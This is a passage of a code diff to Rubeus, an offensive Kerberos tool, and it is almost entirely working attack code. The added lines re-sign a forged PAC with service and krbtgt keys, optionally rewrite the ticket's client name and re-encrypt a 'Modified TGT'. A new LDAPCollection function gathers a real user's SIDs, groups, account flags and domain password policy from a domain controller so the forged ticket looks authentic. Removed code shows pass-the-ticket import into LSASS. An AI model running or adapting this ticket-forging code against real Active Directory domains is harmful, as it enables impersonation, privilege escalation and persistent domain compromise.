+                byte[] kdcSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(krbKey), svrSig, kdcSigData.SignatureType);
+                svrSigData.Signature = svrSig;
+                kdcSigData.Signature = kdcSig;
+                PacInfoBuffers = new List<PacInfoBuffer>();
+                PacInfoBuffers.Add(li);
+                if (cn != null)
+                {
+                    PacInfoBuffers.Add(cn);
+                }
+                if (upnDns != null)
+                {
+                    PacInfoBuffers.Add(upnDns);
+                }
+                if (attrib != null)
+                {
+                    PacInfoBuffers.Add(attrib);
+                }
+                if (requestor != null)
+                {
+                    PacInfoBuffers.Add(requestor);
+                }
+                PacInfoBuffers.Add(svrSigData);
+                PacInfoBuffers.Add(kdcSigData);
+                newPT = new PACTYPE(0, PacInfoBuffers);
 
-            List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
-            LogonInfo li = new LogonInfo(kvi);
-            PacInfoBuffers.Add(li);
-            if (cn != null)
-            {
-                PacInfoBuffers.Add(cn);
-            }
-            if (upnDns != null)
-            {
-                PacInfoBuffers.Add(upnDns);
-            }
-            if (attrib != null)
-            {
-                PacInfoBuffers.Add(attrib);              
-            }
-            if (requestor != null)
-            {
-                PacInfoBuffers.Add(requestor);
-            }
-            PacInfoBuffers.Add(svrSigData);
-            PacInfoBuffers.Add(kdcSigData);
-            PACTYPE newPT = new PACTYPE(0, PacInfoBuffers);
-            byte[] ptBytes = newPT.Encode();
-            byte[] svrSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(serviceKey), ptBytes, svrSigData.SignatureType);
-            byte[] kdcSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(krbKey), svrSig, kdcSigData.SignatureType);
-            svrSigData.Signature = svrSig;
-            kdcSigData.Signature = kdcSig;
-            PacInfoBuffers = new List<PacInfoBuffer>();
-            PacInfoBuffers.Add(li);
-            if (cn != null)
-            {
-                PacInfoBuffers.Add(cn);
-            }
-            if (upnDns != null)
-            {
-                PacInfoBuffers.Add(upnDns);
-            }
-            if (attrib != null)
-            {
-                PacInfoBuffers.Add(attrib);
-            }
-            if (requestor != null)
-            {
-                PacInfoBuffers.Add(requestor);
-            }
-            PacInfoBuffers.Add(svrSigData);
-            PacInfoBuffers.Add(kdcSigData);
-            newPT = new PACTYPE(0, PacInfoBuffers);
+                if (!string.IsNullOrEmpty(ticketUser))
+                {
+                    decryptedEncTicket.cname = new PrincipalName(ticketUser);
+                    kirbi.enc_part.ticket_info[0].pname = new PrincipalName(ticketUser);
+                }
 
-            if (!string.IsNullOrEmpty(ticketUser))
-            {
-                decryptedEncTicket.cname = new PrincipalName(ticketUser);
-                kirbi.enc_part.ticket_info[0].pname = new PrincipalName(ticketUser);
+                decryptedEncTicket.SetPac(newPT);
+                Console.WriteLine("[*] Encrypting Modified TGT");
+                byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, Helpers.StringToByteArray(serviceKey), decryptedEncTicket.Encode().Encode());
+                EncryptedData enc_part = new EncryptedData(ticket.enc_part.etype, encTicketPart, 3);
+                ticket.enc_part = enc_part;
+                kirbi.tickets[0] = ticket;
             }
-
-            decryptedEncTicket.SetPac(newPT);
-            Console.WriteLine("[*] Encrypting Modified TGT");
-            byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, Helpers.StringToByteArray(serviceKey), decryptedEncTicket.Encode().Encode());
-            EncryptedData enc_part = new EncryptedData(ticket.enc_part.etype, encTicketPart, 3);
-            ticket.enc_part = enc_part;
-            kirbi.tickets[0] = ticket;
-
+            
             byte[] kirbiBytes = kirbi.Encode().Encode();
 
             string kirbiString = Convert.ToBase64String(kirbiBytes);
@@ -1493,55 +1198,398 @@ namespace Rubeus
             return kirbiBytes;
         }
 
-        public static void ModifyKirbi(KRB_CRED kirbi, byte[] sessionKey = null, Interop.KERB_ETYPE sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1, bool ptt = false, LUID luid = new LUID(), string outfile = "")
-        {
-            if (sessionKey != null)
+        public static Ndr._KERB_VALIDATION_INFO? LDAPCollection(
+            // always required arguments
+            string user,
+            string ldapuser = "",
+            string ldappassword = "",
+            // domain and DC information
+            string domainController = "",
+            string domain = ""
+            )
+        {// vars
+            int c = 0;
+            System.Net.NetworkCredential ldapCred = null;
+            var uac = PacUserAccountControl.NORMAL_ACCOUNT;
+
+            // initialise LogonInfo section and set defaults
+            var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
+            kvi.FullName = new Ndr._RPC_UNICODE_STRING("");
+            kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING("");
+            kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING("");
+            kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING("");
+            kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
+            kvi.LogonServer = new Ndr._RPC_UNICODE_STRING("");
+            kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
+            kvi.LogoffTime = Ndr._FILETIME.CreateDefault();
+            kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();
+            kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
+            kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();
+            kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();
+            kvi.LogonCount = 0;
+            kvi.BadPasswordCount = 0;
+            kvi.UserId = 500;
+            kvi.PrimaryGroupId = 513;
+            kvi.SidCount = 0;
+            kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
+                    new Ndr._KERB_SID_AND_ATTRIBUTES()};
+
+            // get network credential from ldapuser and ldappassword
+            if (!String.IsNullOrEmpty(ldapuser))
             {
-                kirbi.enc_part.ticket_info[0].key = new EncryptionKey();
-                kirbi.enc_part.ticket_info[0].key.keyvalue = sessionKey;
-                kirbi.enc_part.ticket_info[0].key.keytype = (int)sessionKeyEtype;
-            }
-
-            byte[] kirbiBytes = kirbi.Encode().Encode();
-
-            string kirbiString = Convert.ToBase64String(kirbiBytes);
-
-            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
-
-            if (Program.wrapTickets)
-            {
-                // display the .kirbi base64, columns of 80 chararacters
-                foreach (string line in Helpers.Split(kirbiString, 80))
+                // provide an alternate user to use for connection creds
+                if (!Regex.IsMatch(ldapuser, ".+\\.+", RegexOptions.IgnoreCase))
                 {
-                    Console.WriteLine("      {0}", line);
+                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
+                    return null;
+                }
+
+                try
+                {
+                    string[] ldapParts = ldapuser.Split('\\');
+                    string ldapDomainName = ldapParts[0];
+                    string ldapUserName = ldapParts[1];
+
+                    ldapCred = new System.Net.NetworkCredential(ldapUserName, ldappassword, ldapDomainName);
+                }
+                catch
+                {
+                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
+                    return null;
                 }
             }
-            else
+          
+            // try LDAPS and fail back to LDAP
+            List<IDictionary<string, Object>> ActiveDirectoryObjects = null;
+            bool ssl = true;
+            if (String.IsNullOrEmpty(domainController))
             {
-                Console.WriteLine("      {0}", kirbiString);
+                domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
             }
 
-            Console.WriteLine("");
-
-            if (!String.IsNullOrEmpty(outfile))
+            Console.WriteLine("[*] Trying to query LDAP using LDAPS for user information on domain controller {0}", domainController);
+            ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
+            if (ActiveDirectoryObjects == null)
             {
-                KrbCredInfo info = kirbi.enc_part.ticket_info[0];
-                DateTime fileTime = (DateTime)info.starttime;
-                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
-                filename = Helpers.MakeValidFileName(filename);
-                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                Console.WriteLine("[!] LDAPS failed, retrying with plaintext LDAP.");
+                ssl = false;
+                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
+            }
+            if (ActiveDirectoryObjects == null)
+            {
+                Console.WriteLine("[X] Error LDAP query failed, unable to create ticket using LDAP.");
+                return null;
+            }
+
+            foreach (var userObject in ActiveDirectoryObjects)
+            {
+                string objectSid = (string)userObject["objectsid"];
+                string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
+
+                // parse the UAC field and set in the PAC
+                if (uac == Interop.PacUserAccountControl.NORMAL_ACCOUNT)
                 {
-                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                    kvi.UserAccountControl = 0;
+                    Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)userObject["useraccountcontrol"];
+                    if ((userUAC & Interop.LDAPUserAccountControl.ACCOUNTDISABLE) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNTDISABLE;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.HOMEDIR_REQUIRED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.HOMEDIR_REQUIRED;
+                    }
+
+                    if ((userUAC & Interop.LDAPUserAccountControl.PASSWD_NOTREQD) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWD_NOTREQD;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.TEMP_DUPLICATE_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TEMP_DUPLICATE_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.NORMAL_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NORMAL_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.MNS_LOGON_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.MNS_LOGON_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.WORKSTATION_TRUST_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.WORKSTATION_TRUST_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.SERVER_TRUST_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SERVER_TRUST_ACCOUNT;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD;
+                    }
+                    // Is this right? LDAP UAC field doesn't contain ACCOUNT_AUTO_LOCKED, LOCKOUT looks like the most likely candidate
+                    if ((userUAC & Interop.LDAPUserAccountControl.LOCKOUT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNT_AUTO_LOCKED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.ENCRYPTED_TEXT_PWD_ALLOWED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.SMARTCARD_REQUIRED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SMARTCARD_REQUIRED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_FOR_DELEGATION) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_FOR_DELEGATION;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.NOT_DELEGATED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NOT_DELEGATED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_DES_KEY_ONLY;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.DONT_REQ_PREAUTH) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_REQ_PREAUTH;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.PASSWORD_EXPIRED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWORD_EXPIRED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
+                    }
+                    if ((userUAC & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
+                    }
+                    /* No USE_AES_KEYS bit seems to exist in the UAC field returned by LDAP
+                    if ((userUAC & Interop.LDAPUserAccountControl.USE_AES_KEYS) != 0)
+                    {
+                        kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_AES_KEYS;
+                    }*/
                 }
+
+                if (userObject.ContainsKey("userprincipalname") && !String.IsNullOrWhiteSpace((string)userObject["userprincipalname"]))
+                {
+                    //upnFlags = 0; come back to this :)
+                }
+
+                List<IDictionary<string, Object>> adObjects = null;
+
+                // build group and domain policy filter
+                string filter = "";
+                string outputText = "";
+                if (userObject.ContainsKey("memberof"))
+                {
+                    foreach (string groupDN in (string[])userObject["memberof"])
+                    {
+                        filter += String.Format("(distinguishedname={0})", groupDN);
+                    }
+                    outputText += "group";
+                }
+
+                filter += String.Format("(objectsid={0}-{1})", domainSid, (string)userObject["primarygroupid"]);
+
+                if (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)
+                {
+                    filter = String.Format("{0}(name={{31B2F340-016D-11D2-945F-00C04FB984F9}})", filter);
+                    if (String.IsNullOrEmpty(outputText))
+                    {
+                        outputText = "domain policy";
+                    }
+                    else
+                    {
+                        outputText = String.Format("{0} and domain policy", outputText);
+                    }
+                }
+
+                if (!String.IsNullOrEmpty(filter))
+                {
+                    // Try to get group and domain policy information from LDAP
+                    Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {1}", outputText, domainController);
+                    adObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(|{0})", filter), ssl);
+                    if (adObjects == null)
+                    {
+                        Console.WriteLine("[!] Unable to get {0} information using LDAP, using defaults.", outputText);
+                    }
+                    else
+                    {
+                        if (userObject.ContainsKey("memberof"))
+                        {
+                            kvi.GroupCount = ((string[])userObject["memberof"]).Length + 1;
+                            kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[((string[])userObject["memberof"]).Length + 1];
+                        }
+                        else
+                        {
+                            kvi.GroupCount = 1;
+                            kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[1];
+                        }
+                        c = 0;
+                        foreach (var o in adObjects)
+                        {
+                            if (o.ContainsKey("gpcfilesyspath"))
+                            {
+                                string gptTmplPath = String.Format("{0}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf", (string)o["gpcfilesyspath"]);
+                                gptTmplPath = gptTmplPath.Replace(String.Format("\\\\{0}\\", domain), String.Format("\\\\{0}\\", domainController));
+                                Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, ldapuser, ldappassword);
+
+                                if (gptTmplObject == null)
+                                {
+                                    Console.WriteLine("[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.");
+                                    continue;
+                                }
+                               
+                                var minPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MinimumPasswordAge"]);
+                                if (minPassAge > 0)
+                                {
+                                    kvi.PasswordCanChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)minPassAge));
+                                }
+                                
+                                if (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)
+                                {
+                                    var maxPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MaximumPasswordAge"]);
+                                    if (maxPassAge > 0)
+                                    {
+                                        DateTime pwdLastReset = (DateTime)userObject["pwdlastset"];
+                                        if (pwdLastReset == DateTime.MinValue)
+                                        {
+                                            DateTime dt = DateTime.Now;
+                                            pwdLastReset = dt.AddDays(-2);
+                                        }
+                                        kvi.PasswordMustChange = new Ndr._FILETIME((pwdLastReset.AddDays((double)maxPassAge)));
+                                    }
+                                }
+                            }
+                            else
+                            {
+                                string groupSid = (string)o["objectsid"];
+                                int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
+                                Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
+                                c += 1;
+                            }
+                        }
+                    }
+                }
+
+                // preform the netbios name lookup
+                
+                Console.WriteLine("[*] Retrieving netbios name information over LDAP from domain controller {0}", domainController);
+
+                // first get forest root
+                string forestRoot = null;
+                try
+                {
+                    forestRoot = System.DirectoryServices.ActiveDirectory.Forest.GetCurrentForest().RootDomain.Name;
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Unable to query forest root using System.DirectoryServices.ActiveDirectory.Forest, assuming {0} is the forest root", domain);
+                    forestRoot = domain;
+                }
+
+                string configRootDomain = domain;
+                if (!domain.Equals(forestRoot))
+                    configRootDomain = forestRoot;
+
+                string configOU = String.Format("CN=Configuration,DC={0}", configRootDomain.Replace(".", ",DC="));
+
+                adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ssl);
+                if (adObjects == null)
+                {
+                    Console.WriteLine("[!] Unable to get netbios name information using LDAP, using defaults.");
+                }
+                else
+                {
+                    foreach (var o in adObjects)
+                    {
+                        if (o.ContainsKey("netbiosname"))
+                        {
+                            kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING((string)o["netbiosname"]);
+                        }
+                    }
+                }      
+
+                // set the rest of the PAC fields
+                if (userObject.ContainsKey("displayname"))
+                {
+                    kvi.FullName = new Ndr._RPC_UNICODE_STRING((string)userObject["displayname"]);
+                }
+                
+                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
+                
+                if (userObject.ContainsKey("logoncount"))
+                {
+                    try
+                    {
+                        kvi.LogonCount = short.Parse((string)userObject["logoncount"]);
+                    }
+                    catch
+                    {
+                        kvi.LogonCount = 0;
+                    }
+                }
+                if (userObject.ContainsKey("badpwdcount"))
+                {
+                    try
+                    {
+                        kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);
+                    }
+                    catch
+                    {
+                        kvi.BadPasswordCount = 0;
+                    }
+
+                }
+                if (userObject.ContainsKey("lastlogon") && ((DateTime)userObject["lastlogon"] != DateTime.MinValue))
+                {
+                    kvi.LogonTime = new Ndr._FILETIME((DateTime)userObject["lastlogon"]);
+                }
+
+                if (userObject.ContainsKey("lastlogoff") && ((DateTime)userObject["lastlogoff"] != DateTime.MinValue))
+                {
+                    kvi.LogoffTime = new Ndr._FILETIME((DateTime)userObject["lastlogoff"]);
+                }
+                if (userObject.ContainsKey("pwdlastset") && (DateTime)userObject["pwdlastset"] != DateTime.MinValue)
+                {
+                    kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)userObject["pwdlastset"]);
+                }
+                kvi.PrimaryGroupId = Int32.Parse((string)userObject["primarygroupid"]);
+                kvi.UserId = Int32.Parse(objectSid.Substring(objectSid.LastIndexOf('-') + 1));
+                if (userObject.ContainsKey("homedirectory"))
+                {
+                    kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING((string)userObject["homedirectory"]);
+                }
+                if (userObject.ContainsKey("homedrive"))
+                {
+                    kvi.HomeDirectoryDrive = new Ndr._RPC_UNICODE_STRING((string)userObject["homedrive"]);
+                }
+                if (userObject.ContainsKey("profilepath"))
+                {
+                    kvi.ProfilePath = new Ndr._RPC_UNICODE_STRING((string)userObject["profilepath"]);
+                }
+                if (userObject.ContainsKey("scriptpath"))
+                {
+                    kvi.LogonScript = new Ndr._RPC_UNICODE_STRING((string)userObject["scriptpath"]);
+                }
+
             }
 
-            Console.WriteLine("");
-
-            if (ptt || ((ulong)luid != 0))
-            {
-                // pass-the-ticket -> import into LSASS
-                LSA.ImportTicket(kirbiBytes, luid);
-            }
+            return kvi;
         }
     }
 }
